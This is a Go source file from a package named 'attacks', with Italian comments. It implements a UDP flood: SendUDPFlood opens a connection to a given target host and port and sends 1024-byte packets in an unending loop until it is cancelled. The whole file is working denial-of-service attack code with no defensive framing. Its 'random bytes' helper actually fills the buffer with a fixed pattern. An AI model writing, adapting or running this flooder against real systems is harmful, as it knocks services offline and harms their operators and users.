package attacks

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

// generateRandomBytes genera un array di byte casuale della dimensione specificata
func generateRandomBytes(size int) []byte {
	packet := make([]byte, size)
	for i := range packet {
		packet[i] = byte(i % 256) // Riempimento semplice per esempio
	}
	return packet
}

// SendUDPFlood invia pacchetti UDP ripetuti e gestisce il contesto per fermare l'attacco
func SendUDPFlood(target string, port int, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	addr := fmt.Sprintf("%s:%d", target, port)
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		log.Fatalf("Errore nella risoluzione dell'indirizzo UDP: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Fatalf("Errore nella connessione UDP: %v", err)
	}
	defer conn.Close()

	packet := generateRandomBytes(1024) // Pacchetto UDP da 1024 byte

	for {
		select {
		case <-ctx.Done():
			log.Println("UDP flood interrotto.")
			return
		default:
			_, err := conn.Write(packet)
			if err != nil {
				log.Printf("Errore nell'invio del pacchetto UDP: %v", err)
				time.Sleep(1 * time.Second) // Evita che l'errore riempia il log
			}
		}
	}
}
